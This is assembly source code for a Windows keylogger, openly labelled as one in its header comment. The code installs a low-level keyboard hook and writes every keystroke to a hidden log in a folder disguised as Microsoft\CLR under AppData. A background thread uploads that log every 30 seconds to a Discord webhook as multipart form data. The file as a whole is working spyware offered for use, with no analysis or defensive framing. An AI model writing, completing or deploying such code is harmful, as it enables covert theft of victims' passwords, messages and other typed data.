; Corrected MASM Assembly version of keylogger using only standard Windows APIs
.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc
include masm32.inc
include wininet.inc
include shell32.inc    ; Added for SHGetFolderPath
includelib kernel32.lib
includelib user32.lib
includelib masm32.lib
includelib wininet.lib
includelib shell32.lib ; Added for SHGetFolderPath

; Constants
BUFFER_SIZE     equ 256
MAX_PATH        equ 260
HC_ACTION       equ 0
WH_KEYBOARD_LL  equ 13
FILE_ATTRIBUTE_HIDDEN equ 2
INTERNET_OPEN_TYPE_DIRECT equ 1
INTERNET_SERVICE_HTTP equ 3
INTERNET_DEFAULT_HTTP_PORT equ 80
INTERNET_DEFAULT_HTTPS_PORT equ 443
INTERNET_FLAG_SECURE equ 00800000h


; Structure for keyboard hook
KBDLLHOOKSTRUCT STRUCT
    vkCode      DWORD ?
    scanCode    DWORD ?
    flags       DWORD ?
    time        DWORD ?
    dwExtraInfo DWORD ?
KBDLLHOOKSTRUCT ENDS

; Forward declarations
KeyboardProc PROTO :DWORD, :DWORD, :DWORD
TranslateKey PROTO :DWORD
SaveToLogFile PROTO :BYTE
UploadThread PROTO :DWORD
UploadToDiscord PROTO

.data
    hHook           dd 0
    logFilePath     db MAX_PATH dup(0)
    uploadedPath    db MAX_PATH dup(0)
    appDataPath     db MAX_PATH dup(0)
    directoryPath   db MAX_PATH dup(0)
    microsoftClrDir db "\Microsoft\CLR\", 0
    logsFileName    db "log.txt", 0
    tempBuffer      db MAX_PATH dup(0)
    keyboardState   db 256 dup(0)

    

    hInternet      dd 0
    hConnect       dd 0
    hRequest       dd 0
    fileHandle     dd 0
    fileSize       dd 0
    bytesRead      dd 0
    boundary       db "------------------------BOUNDARY1337",0
    crlf           db 13,10,0
    szPost         db "POST",0
    szWebhookHost  db "discord.com",0
    szWebhookPath  db "Webhook_URL",0
    szUserAgent    db "BlackRoseUploader",0
    szFilePath     db 'C:\Users\blackrose\AppData\Roaming\Microsoft\CLR\logs.txt',0
    szFilename     db "logs.txt",0
    szHeaderFmt    db "Content-Type: multipart/form-data; boundary=%s",0

    ; Properly formatted multipart segments
    szMultipartStart db "--%s",13,10
                    db "Content-Disposition: form-data; name=""file""; filename=""%s""",13,10
                    db "Content-Type: application/octet-stream",13,10,13,10,0

    szMultipartEnd   db 13,10,"--%s--",13,10,0

    szBuffer       db 4096 dup(0)
    szHeaderBuffer db 1024 dup(0)
    szFinalData    dd 0
    finalSize      dd 0
    headerSize     dd 0
    footerSize     dd 0
    totalSize      dd 0
    
.data?
    msg             MSG <>
    threadID        dd ?
    ascii           dw ?
    params          dd 2 dup(?)
    bytesWritten    dd ?
    tempChar        db ?
    fileBuffer      db 4096 dup(?)  ; Buffer for file contents
    


.code

; Main entry point
main:
    invoke GetModuleHandle, NULL
    mov ebx, eax
    
    ; Get AppData path (C:\Users\<user>\AppData\Roaming)
    invoke SHGetFolderPathA, NULL, CSIDL_APPDATA, NULL, 0, ADDR appDataPath

    ; Combine path: AppData + \Microsoft\CLR
    invoke lstrcpy, ADDR directoryPath, ADDR appDataPath
    invoke lstrcat, ADDR directoryPath, ADDR microsoftClrDir

    ; Create directory structure
    invoke CreateDirectory, ADDR directoryPath, NULL
    
    ; Hide the directory
    invoke SetFileAttributes, ADDR directoryPath, FILE_ATTRIBUTE_HIDDEN
    
    ; Create log file path
    invoke lstrcpy, ADDR logFilePath, ADDR directoryPath
    invoke lstrcat, ADDR logFilePath, ADDR logsFileName
    
    ; Store parameters for upload thread
    lea eax, logFilePath
    mov [params], eax
    lea eax, uploadedPath
    mov [params+4], eax
    
    ; Create upload thread
    invoke CreateThread, NULL, 0, OFFSET UploadThread, ADDR params, 0, ADDR threadID
    
    ; Set keyboard hook
    invoke SetWindowsHookEx, WH_KEYBOARD_LL, OFFSET KeyboardProc, ebx, 0
    mov hHook, eax
    
MessageLoop:
    invoke GetMessage, ADDR msg, NULL, 0, 0
    test eax, eax
    jz ExitProgram
    
    invoke TranslateMessage, ADDR msg
    invoke DispatchMessage, ADDR msg
    jmp MessageLoop
    
ExitProgram:
    invoke UnhookWindowsHookEx, hHook
    invoke ExitProcess, 0

; Keyboard hook procedure
KeyboardProc PROC nCode:DWORD, wParam:DWORD, lParam:DWORD
    cmp nCode, HC_ACTION
    jne ReturnNextHook
    
    cmp wParam, WM_KEYDOWN
    jne ReturnNextHook
    
    mov edx, lParam
    assume edx:ptr KBDLLHOOKSTRUCT
    mov eax, [edx].vkCode
    
    ; Call TranslateKey
    invoke TranslateKey, eax
    mov tempChar, al
    
    cmp al, 0
    je ReturnNextHook
    
    ; Save the key to log file
    invoke SaveToLogFile, tempChar
    
ReturnNextHook:
    invoke CallNextHookEx, hHook, nCode, wParam, lParam
    ret
KeyboardProc ENDP

; Translate virtual key code to ASCII
TranslateKey PROC vkCode:DWORD
    invoke GetKeyboardState, ADDR keyboardState
    
    ; Get scan code for the virtual key
    invoke MapVirtualKey, vkCode, 0
    
    ; Convert to ASCII
    invoke ToAscii, vkCode, eax, ADDR keyboardState, ADDR ascii, 0
    cmp eax, 1
    jne NoCharacter
    
    movzx eax, ascii
    jmp Exit
    
NoCharacter:
    xor eax, eax
    
Exit:
    ret
TranslateKey ENDP

; Save character to log file
SaveToLogFile PROC character:BYTE
    LOCAL hFile:DWORD
    LOCAL charBuf:BYTE
    
    ; Store character in local variable
    mov al, byte ptr character
    mov byte ptr charBuf, al
    
    ; Open/create the log file
    invoke CreateFile, ADDR logFilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL
    mov hFile, eax
    
    ; Check if file opened successfully
    cmp eax, INVALID_HANDLE_VALUE
    je Exit
    
    ; Move to end of file
    invoke SetFilePointer, hFile, 0, NULL, FILE_END
    
    ; Write the character
    invoke WriteFile, hFile, ADDR charBuf, 1, ADDR bytesWritten, NULL
    
    ; Close the file
    invoke CloseHandle, hFile
    
Exit:
    ret
SaveToLogFile ENDP

; Thread to periodically upload log file
UploadThread PROC lpParam:DWORD
    ; This function runs in a separate thread to handle file uploads

UploadLoop:
    invoke UploadToDiscord
    
    ; Sleep for 30 seconds (30000 milliseconds)
    invoke Sleep, 30000

    jmp UploadLoop
    
    ; The below code will never execute due to the unconditional jump above
    ; but we keep the return for proper function structure
    xor eax, eax
    ret
UploadThread ENDP

UploadToDiscord PROC
    invoke InternetOpen, offset szUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    mov hInternet, eax
    test eax, eax
    jz cleanup
    
    invoke InternetConnect, hInternet, offset szWebhookHost, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    mov hConnect, eax
    test eax, eax
    jz cleanup

    invoke HttpOpenRequest, hConnect, offset szPost, offset szWebhookPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0
    mov hRequest, eax
    test eax, eax
    jz cleanup

    ; Format Content-Type header with boundary
    invoke wsprintf, addr szHeaderBuffer, offset szHeaderFmt, offset boundary
    invoke HttpAddRequestHeaders, hRequest, addr szHeaderBuffer, -1, HTTP_ADDREQ_FLAG_REPLACE

    ; Open file
    invoke CreateFile, offset szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov fileHandle, eax
    cmp eax, INVALID_HANDLE_VALUE
    je cleanup

    invoke GetFileSize, fileHandle, NULL
    mov fileSize, eax

    ; Calculate needed memory size
    ; First calculate header size
    invoke wsprintf, addr szBuffer, offset szMultipartStart, offset boundary, offset szFilename
    invoke lstrlen, addr szBuffer
    mov headerSize, eax

    ; Calculate footer size
    invoke wsprintf, addr szBuffer, offset szMultipartEnd, offset boundary
    invoke lstrlen, addr szBuffer
    mov footerSize, eax

    ; Calculate total size needed
    mov eax, headerSize
    add eax, fileSize
    add eax, footerSize
    add eax, 16  ; Extra padding just to be safe
    mov totalSize, eax

    ; Allocate memory for the entire multipart data
    invoke GlobalAlloc, GMEM_ZEROINIT, totalSize
    mov szFinalData, eax
    test eax, eax
    jz close_file

    ; Build the multipart form data
    ; 1. Header
    mov edi, szFinalData
    invoke wsprintf, addr szBuffer, offset szMultipartStart, offset boundary, offset szFilename
    invoke lstrcpy, edi, addr szBuffer
    invoke lstrlen, edi
    add edi, eax

    ; 2. File data
    invoke ReadFile, fileHandle, edi, fileSize, addr bytesRead, NULL
    add edi, bytesRead

    ; 3. Footer
    invoke wsprintf, addr szBuffer, offset szMultipartEnd, offset boundary
    invoke lstrcpy, edi, addr szBuffer
    
    ; Calculate the final size
    mov eax, headerSize
    add eax, bytesRead
    add eax, footerSize
    mov finalSize, eax

    ; Send the request
    invoke HttpSendRequest, hRequest, NULL, 0, szFinalData, finalSize

close_file:
    invoke CloseHandle, fileHandle

cleanup:
    ; Free allocated memory
    cmp szFinalData, 0
    je no_memory_to_free
    invoke GlobalFree, szFinalData
    
no_memory_to_free:
    ; Close handles
    cmp hRequest, 0
    je no_request_to_close
    invoke InternetCloseHandle, hRequest

no_request_to_close:
    cmp hConnect, 0
    je no_connect_to_close
    invoke InternetCloseHandle, hConnect

no_connect_to_close:
    cmp hInternet, 0
    je no_internet_to_close
    invoke InternetCloseHandle, hInternet

no_internet_to_close:
    ret
UploadToDiscord ENDP
end main